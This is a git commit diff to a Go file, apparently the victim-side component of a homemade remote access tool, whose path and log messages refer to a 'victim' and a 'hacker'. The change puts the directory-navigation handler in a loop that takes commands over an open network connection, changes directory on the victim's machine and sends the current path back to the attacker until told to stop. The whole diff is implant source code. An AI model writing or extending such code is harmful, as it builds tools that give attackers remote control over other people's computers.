1a745a9e7140c135c37051ae2b329bdd764625b9
devkaare <kaarehofferdal@gmail.com>
2025-01-25 21:02:41 +0100

    Feat

--- VictimFinalVersion/core/Move/move.go
+++ VictimFinalVersion/core/Move/move.go
@@ -22,27 +22,36 @@ func NavigateFilesystem(connection net.Conn) (err error) {
 
 	CommandReader := bufio.NewReader(connection)
 
-	user_command_raw, err := CommandReader.ReadString('\n')
-	if err != nil {
-		fmt.Println("[+] Unable to read command ")
-	}
+	loopControl := true
 
-	user_command := strings.TrimSuffix(user_command_raw, "\n")
-
-	user_command_arr := strings.Split(user_command, " ")
-
-	if len(user_command_arr) > 1 {
-		dir2move := user_command_arr[1]
-		err := os.Chdir(dir2move)
+	for loopControl {
+		user_command_raw, err := CommandReader.ReadString('\n')
 		if err != nil {
-			fmt.Println("[-] Unable to change directory")
+			fmt.Println("[+] Unable to read command ")
 		}
+
+		if user_command_raw == "stop\n" {
+			loopControl = false
+			break
+		}
+
+		user_command := strings.TrimSuffix(user_command_raw, "\n")
+
+		user_command_arr := strings.Split(user_command, " ")
+
+		if len(user_command_arr) > 1 {
+			dir2move := user_command_arr[1]
+			err := os.Chdir(dir2move)
+			if err != nil {
+				fmt.Println("[-] Unable to change directory")
+			}
+		}
+
+		pwd, err = os.Getwd()
+
+		nbytes, err := connection.Write([]byte(pwd + "\n"))
+		fmt.Println("[+] Pwd written to the hacker, ", nbytes)
 	}
-
-	pwd, err = os.Getwd()
-
-	nbytes, err := connection.Write([]byte(pwd + "\n"))
-	fmt.Println("[+] Pwd written to the hacker, ", nbytes)
 
 	return
 }
